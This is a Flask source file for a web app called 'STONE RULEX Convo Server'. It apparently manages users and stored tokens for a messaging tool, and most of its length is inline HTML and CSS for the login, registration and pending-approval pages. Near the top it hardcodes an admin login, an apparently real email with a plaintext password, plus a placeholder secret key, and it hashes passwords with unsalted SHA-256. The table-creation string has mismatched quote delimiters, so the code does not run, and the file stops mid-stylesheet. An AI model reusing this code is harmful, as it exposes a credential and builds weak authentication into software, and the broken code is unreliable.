from flask import Flask, render_template_string, request, redirect, url_for, jsonify, session, flash
import requests
import json
import time
import os
import threading
from datetime import datetime, timedelta
import uuid
import sqlite3
import hashlib
from functools import wraps

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this to a random secret key

# Configuration for admin credentials - can be changed here
ADMIN_CONFIG = {
    'username': 'thewstones57@gmail.com',
    'password': 'The_stone_king_of_ring'  # Change this password as needed
}

# Database initialization
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Create users table with approval status
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 username TEXT UNIQUE,
                 password TEXT,
                 admin INTEGER DEFAULT 0,
                 approved INTEGER DEFAULT 0,
                 tokens TEXT DEFAULT '',
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    
    # Create admin user if not exists or update password if changed
    c.execute("SELECT * FROM users WHERE username = ?", (ADMIN_CONFIG['username'],))
    admin_user = c.fetchone()
    
    hashed_password = hashlib.sha256(ADMIN_CONFIG['password'].encode()).hexdigest()
    
    if admin_user:
        # Update admin password if it has changed
        c.execute("UPDATE users SET password = ? WHERE username = ?", 
                 (hashed_password, ADMIN_CONFIG['username']))
    else:
        # Create new admin user
        c.execute("INSERT INTO users (username, password, admin, approved) VALUES (?, ?, 1, 1)", 
                 (ADMIN_CONFIG['username'], hashed_password))
    
    conn.commit()
    conn.close()

init_db()

# Global variables
message_threads = {}  # Dictionary to store multiple threads with their IDs
task_logs = {}  # Dictionary to store logs for each task
stop_flags = {}  # Dictionary to store stop flags for each task

# Authentication decorators
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def approved_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT approved FROM users WHERE id = ?", (session['user_id'],))
        user = c.fetchone()
        conn.close()
        
        if not user or user[0] != 1:
            return render_template_string(pending_approval_html)
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT admin, approved FROM users WHERE id = ?", (session['user_id'],))
        user = c.fetchone()
        conn.close()
        
        if not user or user[0] != 1 or user[1] != 1:
            return "Admin access required", 403
        return f(*args, **kwargs)
    return decorated_function

# Enhanced pending approval page HTML with more fancy styling
pending_approval_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX - Pending Approval</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                        radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
                        radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
            animation: float 6s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(1deg); }
        }
        
        .pending-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15), 
                        0 0 0 1px rgba(255, 255, 255, 0.2);
            max-width: 600px;
            padding: 50px;
            text-align: center;
            position: relative;
            z-index: 1;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .pending-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0.05) 100%);
            border-radius: 25px;
            z-index: -1;
        }
        
        .pending-icon {
            font-size: 5rem;
            background: linear-gradient(135deg, #ffc107 0%, #ff8c00 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 25px;
            animation: pulse 2s infinite, glow 3s ease-in-out infinite alternate;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        @keyframes glow {
            from { filter: drop-shadow(0 0 5px rgba(255, 193, 7, 0.5)); }
            to { filter: drop-shadow(0 0 20px rgba(255, 193, 7, 0.8)); }
        }
        
        .pending-title {
            font-size: 2.5rem;
            background: linear-gradient(135deg, #495057 0%, #343a40 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 20px;
            font-weight: 800;
            letter-spacing: -1px;
        }
        
        .pending-message {
            font-size: 1.2rem;
            color: #6c757d;
            margin-bottom: 35px;
            line-height: 1.7;
            font-weight: 500;
        }
        
        .btn-logout {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 35px;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            text-decoration: none;
            display: inline-block;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }
        
        .btn-logout::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        
        .btn-logout:hover::before {
            left: 100%;
        }
        
        .btn-logout:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        
        .status-info {
            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
            border: 2px solid #ffd700;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 35px;
            color: #856404;
            position: relative;
            overflow: hidden;
        }
        
        .status-info::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #ffd700, #ffed4e, #ffd700);
            animation: shimmer 2s linear infinite;
        }
        
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        .status-info strong {
            font-size: 1.1rem;
            display: block;
            margin-bottom: 8px;
        }
        
        .floating-shapes {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }
        
        .shape {
            position: absolute;
            opacity: 0.1;
            animation: float-shapes 20s infinite linear;
        }
        
        .shape:nth-child(1) {
            top: 20%;
            left: 10%;
            animation-delay: 0s;
        }
        
        .shape:nth-child(2) {
            top: 60%;
            left: 80%;
            animation-delay: 5s;
        }
        
        .shape:nth-child(3) {
            top: 80%;
            left: 20%;
            animation-delay: 10s;
        }
        
        @keyframes float-shapes {
            0% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-100px) rotate(180deg); }
            100% { transform: translateY(0px) rotate(360deg); }
        }
        
        @media (max-width: 480px) {
            .pending-container {
                margin: 10px;
                padding: 30px 20px;
                border-radius: 20px;
            }
            
            .pending-title {
                font-size: 2rem;
            }
            
            .pending-icon {
                font-size: 4rem;
            }
        }
    </style>
</head>
<body>
    <div class="floating-shapes">
        <div class="shape"><i class="fas fa-star" style="font-size: 2rem; color: #ffd700;"></i></div>
        <div class="shape"><i class="fas fa-gem" style="font-size: 1.5rem; color: #667eea;"></i></div>
        <div class="shape"><i class="fas fa-crown" style="font-size: 2.5rem; color: #764ba2;"></i></div>
    </div>
    
    <div class="pending-container">
        <div class="pending-icon">â³</div>
        <h1 class="pending-title">Account Pending Approval</h1>
        <div class="status-info">
            <strong>ðŸ” Your account is currently under review</strong>
            Please wait for an administrator to approve your access to STONE RULEX tools.
        </div>
        <p class="pending-message">
            Thank you for registering! Your account has been created successfully, but it requires approval from an administrator before you can access the tools. You will be notified once your account is approved.
        </p>
        <a href="/logout" class="btn-logout">
            <i class="fas fa-sign-out-alt"></i> Logout
        </a>
    </div>
</body>
</html>
'''

# Enhanced login/register HTML with more fancy styling
auth_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX - Access Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }
        
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
            animation: backgroundFloat 8s ease-in-out infinite;
        }
        
        @keyframes backgroundFloat {
            0%, 100% { transform: scale(1) rotate(0deg); }
            50% { transform: scale(1.1) rotate(2deg); }
        }
        
        .auth-container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(25px);
            border-radius: 30px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2), 
                        0 0 0 1px rgba(255, 255, 255, 0.3);
            max-width: 480px;
            width: 100%;
            overflow: hidden;
            position: relative;
            z-index: 1;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .auth-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0.05) 100%);
            border-radius: 30px;
            z-index: -1;
        }
        
        .auth-header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 50px 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .auth-header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: headerGlow 4s ease-in-out infinite;
        }
        
        @keyframes headerGlow {
            0%, 100% { transform: scale(1) rotate(0deg); }
            50% { transform: scale(1.2) rotate(180deg); }
        }
        
        .auth-title {
            font-size: 3rem;
            font-weight: 900;
            margin-bottom: 15px;
            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.3);
            position: relative;
            z-index: 1;
            letter-spacing: -2px;
        }
        
        .auth-subtitle {
            font-size: 1.1rem;
            opacity: 0.95;
            position: relative;
            z-index: 1;
            font-weight: 500;
        }
        
        .auth-tabs {
            display: flex;
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            border-bottom: 1px solid #dee2e6;
        }
        
        .auth-tab {
            flex: 1;
            padding: 25px 20px;
            text-align: center;
            cursor: pointer;
            font-weight: 700;
            color: #6c757d;
            transition: all 0.4s ease;
            position: relative;
            background: transparent;
            border: none;
            font-size: 16px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .auth-tab::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            width: 0;
            height: 4px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            transition: all 0.4s ease;
            transform: translateX(-50%);
        }
        
        .auth-tab:hover {
            background: linear-gradient(135deg, #e9ecef 0%, #f8f9fa 100%);
            color: #667eea;
            transform: translateY(-2px);
        }
        
        .auth-tab.active {
            color: #667eea;
            background: white;
            box-shadow: 0 -5px 15px rgba(102, 126, 234, 0.1);
        }
        
        .auth-tab.active::before {
            width: 80%;
        }
        
        .auth-form {
            display: none;
            padding: 45px 35px;
        }
        
        .auth-form.active {
            display: block;
            animation: fadeInUp 0.5s ease;
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .form-group {
            margin-bottom: 30px;
            position: relative;
        }
        
        .form-group i {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: #6c757d;
            font-size: 18px;
            z-index: 2;
            transition: all 0.3s ease;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 700;
            color: #495057;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 20px 20px 20px 55px;
            border: 2px solid #e9ecef;
            border-radius: 15px;
            font-size: 16px;
            transition: all 0.4s ease;
            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
            font-family: inherit;
            font-weight: 500;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 6px rgba(102, 126, 234, 0.1);
            transform: translateY(-2px);
        }
        
        input[type="text"]:focus + i,
        input[type="password"]:focus + i {
            color: #667eea;
            transform: translateY(-50%) scale(1.1);
        }
        
        .btn {
            width: 100%;
            padding: 20px;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.6s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 40px rgba(102, 126, 234, 0.4);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
        }
        
        .btn-success:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 40px rgba(40, 167, 69, 0.4);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
            color: #212529;
            box-shadow: 0 10px 20px rgba(255, 193, 7, 0.3);
        }
        
        .btn-warning:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 40px rgba(255, 193, 7, 0.4);
        }
        
        .alert {
            padding: 18px 25px;
            border-radius: 12px;
            margin-top: 25px;
            font-weight: 600;
            text-align: center;
            border: 2px solid;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .alert-danger {
            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
            color: #721c24;
            border-color: #f5c6cb;
        }
        
        .alert-success {
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
            color: #155724;
            border-color: #c3e6cb;
        }
        
        .form-footer {
            text-align: center;
            margin-top: 35px;
            padding-top: 25px;
            border-top: 2px solid #e9ecef;
            color: #6c757d;
            font-size: 14px;
            font-weight: 500;
        }
        
        .floating-elements {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }
        
        .floating-element {
            position: absolute;
            opacity: 0.1;
            animation: floatAround 15s infinite linear;
            font-size: 2rem;
            color: white;
        }
        
        .floating-element:nth-child(1) {
            top: 10%;
            left: 10%;
            animation-delay: 0s;
        }
        
        .floating-element:nth-child(2) {
            top: 70%;
            left: 80%;
            animation-delay: 5s;
        }
        
        .floating-element:nth-child(3) {
            top: 50%;
            left: 20%;
            animation-delay: 10s;
        }
        
        @keyframes floatAround {
            0% { transform: translateY(0px) rotate(0deg); }
            25% { transform: translateY(-50px) rotate(90deg); }
            50% { transform: translateY(-100px) rotate(180deg); }
            75% { transform: translateY(-50px) rotate(270deg); }
            100% { transform: translateY(0px) rotate(360deg); }
        }
        
        @media (max-width: 480px) {
            .auth-container {
                margin: 10px;
                border-radius: 25px;
            }
            
            .auth-header {
                padding: 35px 25px;
            }
            
            .auth-title {
                font-size: 2.5rem;
            }
            
            .auth-form {
                padding: 35px 25px;
            }
            
            .auth-tab {
                padding: 20px 15px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="floating-elements">
        <div class="floating-element"><i class="fas fa-star"></i></div>
        <div class="floating-element"><i class="fas fa-gem"></i></div>
        <div class="floating-element"><i class="fas fa-crown"></i></div>
    </div>
    
    <div class="auth-container">
        <div class="auth-header">
            <h1 class="auth-title">STONE RULEX</h1>
            <p class="auth-subtitle">Welcome To The Stone Rulex Convo Server</p>
        </div>
        
        <div class="auth-tabs">
            <button class="auth-tab active" onclick="switchAuthTab('login')">
                <i class="fas fa-sign-in-alt"></i> Login
            </button>
            <button class="auth-tab" onclick="switchAuthTab('register')">
                <i class="fas fa-user-plus"></i> Register
            </button>
            <button class="auth-tab" onclick="switchAuthTab('admin')">
                <i class="fas fa-user-shield"></i> Admin Login
            </button>
        </div>
        
        <div id="login-form" class="auth-form active">
            <form action="/login" method="post">
                <div class="form-group">
                    <label for="login-username">
                        <i class="fas fa-user"></i> Username
                    </label>
                    <input type="text" id="login-username" name="username" placeholder="Enter your username" required>
                    <i class="fas fa-user"></i>
                </div>
                <div class="form-group">
                    <label for="login-password">
                        <i class="fas fa-lock"></i> Password
                    </label>
                    <input type="password" id="login-password" name="password" placeholder="Enter your password" required>
                    <i class="fas fa-lock"></i>
                </div>
                <button type="submit" class="btn btn-primary">
                    <i class="fas fa-sign-in-alt"></i> Access Platform
                </button>
            </form>
            
            {% with messages = get_flashed_messages(category_filter=['error']) %}
                {% if messages %}
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> {{ messages[0] }}
                    </div>
                {% endif %}
            {% endwith %}
            
            <div class="form-footer">
                <i class="fas fa-shield-alt"></i> Secure authentication powered by advanced encryption
            </div>
        </div>
        
        <div id="register-form" class="auth-form">
            <form action="/register" method="post">
                <div class="form-group">
                    <label for="register-username">
                        <i class="fas fa-user"></i> Username
                    </label>
                    <input type="text" id="register-username" name="username" placeholder="Enter your username" required>
                    <i class="fas fa-user"></i>
                </div>
                <div class="form-group">
                    <label for="register-password">
                        <i class="fas fa-lock"></i> Password
                    </label>
                    <input type="password" id="register-password" name="password" placeholder="Create a password" required>
                    <i class="fas fa-lock"></i>
                </div>
                <div class="form-group">
                    <label for="confirm-password">
                        <i class="fas fa-lock"></i> Confirm Password
                    </label>
                    <input type="password" id="confirm-password" name="confirm_password" placeholder="Confirm your password" required>
                    <i class="fas fa-lock"></i>
                </div>
                <button type="submit" class="btn btn-success">
                    <i class="fas fa-user-plus"></i> Create Account
                </button>
            </form>
            
            {% with messages = get_flashed_messages(category_filter=['success', 'error']) %}
                {% if messages %}
                    <div class="alert {% if 'success' in get_flashed_messages(with_categories=true)[0][0] %}alert-success{% else %}alert-danger{% endif %}">
                        <i class="fas {% if 'success' in get_flashed_messages(with_categories=true)[0][0] %}fa-check-circle{% else %}fa-exclamation-triangle{% endif %}"></i> {{ messages[0] }}
                    </div>
                {% endif %}
            {% endwith %}
            
            <div class="form-footer">
                <i class="fas fa-info-circle"></i> New accounts require administrator approval
            </div>
        </div>
        
        <div id="admin-form" class="auth-form">
            <form action="/admin_login" method="post">
                <div class="form-group">
                    <label for="admin-username">
                        <i class="fas fa-user-shield"></i> Admin Username
                    </label>
                    <input type="text" id="admin-username" name="username" placeholder="Enter admin username" required>
                    <i class="fas fa-user-shield"></i>
                </div>
                <div class="form-group">
                    <label for="admin-password">
                        <i class="fas fa-key"></i> Admin Password
                    </label>
                    <input type="password" id="admin-password" name="password" placeholder="Enter admin password" required>
                    <i class="fas fa-key"></i>
                </div>
                <button type="submit" class="btn btn-warning">
                    <i class="fas fa-user-shield"></i> Admin Access
                </button>
            </form>
            
            {% with messages = get_flashed_messages(category_filter=['admin_error']) %}
                {% if messages %}
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-triangle"></i> {{ messages[0] }}
                    </div>
                {% endif %}
            {% endwith %}
            
            <div class="form-footer">
                <i class="fas fa-shield-alt"></i> Administrator access with elevated privileges
            </div>
        </div>
    </div>

    <script>
        function switchAuthTab(tab) {
            // Remove active class from all tabs and forms
            document.querySelectorAll('.auth-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
            
            // Add active class to selected tab and form
            if (tab === 'login') {
                document.querySelector('.auth-tab:first-child').classList.add('active');
                document.getElementById('login-form').classList.add('active');
            } else if (tab === 'register') {
                document.querySelector('.auth-tab:nth-child(2)').classList.add('active');
                document.getElementById('register-form').classList.add('active');
            } else if (tab === 'admin') {
                document.querySelector('.auth-tab:nth-child(3)').classList.add('active');
                document.getElementById('admin-form').classList.add('active');
            }
        }
        
        // Add interactive effects
        document.addEventListener('DOMContentLoaded', function() {
            const inputs = document.querySelectorAll('input');
            inputs.forEach(input => {
                input.addEventListener('focus', function() {
                    this.parentElement.style.transform = 'scale(1.02)';
                    this.parentElement.style.transition = 'transform 0.3s ease';
                });
                
                input.addEventListener('blur', function() {
                    this.parentElement.style.transform = 'scale(1)';
                });
            });
            
            // Add typing effect to title
            const title = document.querySelector('.auth-title');
            const text = title.textContent;
            title.textContent = '';
            let i = 0;
            const typeWriter = () => {
                if (i < text.length) {
                    title.textContent += text.charAt(i);
                    i++;
                    setTimeout(typeWriter, 100);
                }
            };
            setTimeout(typeWriter, 500);
        });
    </script>

    <!-- Log Overlay HTML -->
    <div id="log-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center;">
        <div style="background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; padding: 25px; border-radius: 15px; height: 80%; width: 80%; overflow-y: auto; border: 2px solid #333; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1); position: relative;">
            <button onclick="closeLogs()" style="position: absolute; top: 10px; right: 10px; background: #dc3545; color: white; border: none; border-radius: 5px; padding: 8px 12px; cursor: pointer;">Close</button>
            <pre id="log-content" style="margin-top: 30px;"></pre>
        </div>
    </div>
</body>
</html>
'''



# Enhanced main application HTML with more fancy styling
html_content = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>STONE RULEX</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
            animation: backgroundFloat 12s ease-in-out infinite;
            z-index: -1;
        }
        
        @keyframes backgroundFloat {
            0%, 100% { transform: scale(1) rotate(0deg); }
            50% { transform: scale(1.1) rotate(1deg); }
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15), 
                        0 0 0 1px rgba(255, 255, 255, 0.2);
            max-width: 1400px;
            margin: 0 auto;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: headerGlow 6s ease-in-out infinite;
        }
        
        @keyframes headerGlow {
            0%, 100% { transform: scale(1) rotate(0deg); }
            50% { transform: scale(1.2) rotate(180deg); }
        }
        
        .header h1 {
            font-size: 3.5rem;
            margin-bottom: 15px;
            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.3);
            font-weight: 900;
            letter-spacing: -2px;
            position: relative;
            z-index: 1;
        }
        
        .header p {
            font-size: 1.3rem;
            opacity: 0.95;
            position: relative;
            z-index: 1;
            font-weight: 500;
        }
        
        .user-info {
            position: absolute;
            top: 25px;
            right: 25px;
            display: flex;
            align-items: center;
            gap: 15px;
            z-index: 2;
        }
        
        .user-username {
            color: white;
            font-weight: 700;
            font-size: 1.1rem;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
        }
        
        .btn-logout, .btn-admin {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.4s ease;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        
        .btn-logout:hover, .btn-admin:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }
        
        .tabs {
            display: flex;
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            border-bottom: 2px solid #dee2e6;
        }
        
        .tab {
            flex: 1;
            padding: 25px 20px;
            text-align: center;
            cursor: pointer;
            background: transparent;
            border: none;
            font-size: 16px;
            font-weight: 700;
            color: #495057;
            transition: all 0.4s ease;
            position: relative;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .tab::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            width: 0;
            height: 4px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            transition: all 0.4s ease;
            transform: translateX(-50%);
        }
        
        .tab:hover {
            background: linear-gradient(135deg, #e9ecef 0%, #f8f9fa 100%);
            color: #667eea;
            transform: translateY(-2px);
        }
        
        .tab.active {
            background: white;
            color: #667eea;
            box-shadow: 0 -5px 15px rgba(102, 126, 234, 0.1);
        }
        
        .tab.active::before {
            width: 80%;
        }
        
        .tab-content {
            display: none;
            padding: 40px;
            min-height: 600px;
        }
        
        .tab-content.active {
            display: block;
            animation: fadeInUp 0.6s ease;
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .form-group {
            margin-bottom: 30px;
            position: relative;
        }
        
        label {
            display: block;
            margin-bottom: 12px;
            font-weight: 700;
            color: #495057;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        input[type="text"],
        input[type="number"],
        textarea,
        input[type="file"] {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #e9ecef;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.4s ease;
            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
            font-family: inherit;
            font-weight: 500;
        }
        
        input[type="text"]:focus,
        input[type="number"]:focus,
        textarea:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 6px rgba(102, 126, 234, 0.1);
            transform: translateY(-2px);
        }
        
        textarea {
            resize: vertical;
            min-height: 140px;
            font-family: 'Courier New', monospace;
        }
        
        .btn {
            padding: 18px 35px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin: 8px;
            min-width: 160px;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.6s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
